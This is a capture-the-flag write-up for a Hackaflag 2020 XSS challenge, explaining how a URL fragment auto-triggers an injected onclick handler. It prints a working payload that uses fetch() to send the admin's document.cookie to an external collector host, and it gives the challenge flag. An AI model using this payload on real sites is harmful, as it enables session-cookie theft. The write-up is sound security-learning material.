# alert('wtf')
### STAGE: LINUS TORVALDS

This challenge is very simple if you use a "trick". We control what is inside the "onclick", so we can insert a "fetch" there to make the admin send us hi cookie. However, how do we trigger the onclick without clicking on the button?

Here, the trick I talked about is used. If, in the URL we sendo to the admin, we pass a `#<button_id>`, the onclick will be executed as the page loads. The HTML for the button will be:

``` HTML
<button id="x" onclick="fetch(`https://entrqu3y5wfm.x.pipedream.net/pwn=`+document.cookie)">Click me</button>
```

and the payload we will send to the admin is: 
```
http://159.65.249.122:4113/?dom=fetch(`https://entrqu3y5wfm.x.pipedream.net/pwn=`%2Bdocument.cookie)#x
```

Just like in the other Hackaflag challenges, we have a page where we send a URL that will be accessed by the admin. His cookie is the flag.
![Contact Admin Page](https://github.com/Haltz01/CTFs_Writeups/blob/master/2020_Hackaflag/alert(wtf)/alert2.png)

We get the admin's cookie and URL decode it. Done, we have the flag :)
`HACKAFLAG%7B4ut0_tr1gg3r_s4v3_m3%7D` -> URL DECODE -> `HACKAFLAG{4ut0_tr1gg3r_s4v3_m3}`

**Flag: `HACKAFLAG{4ut0_tr1gg3r_s4v3_m3}`**
